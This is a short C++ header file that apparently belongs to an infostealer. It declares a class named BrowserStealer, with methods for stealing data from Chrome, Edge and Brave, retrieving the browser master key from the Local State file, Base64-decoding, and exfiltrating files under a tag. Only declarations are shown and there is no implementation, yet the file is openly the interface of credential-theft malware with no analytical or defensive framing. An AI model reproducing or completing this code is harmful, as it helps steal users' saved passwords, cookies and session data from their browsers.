#pragma once
#include <string>
#include <vector>

class BrowserStealer {
public:
    static void Run();
private:
    static void StealChrome();
    static void StealEdge();
    static void StealBrave();
    static bool ExfiltrateFile(const std::string& filePath, const std::string& tag);
    static std::string GetMasterKey(const std::string& localStatePath);
    static std::string Base64Decode(const std::string& encoded);
};
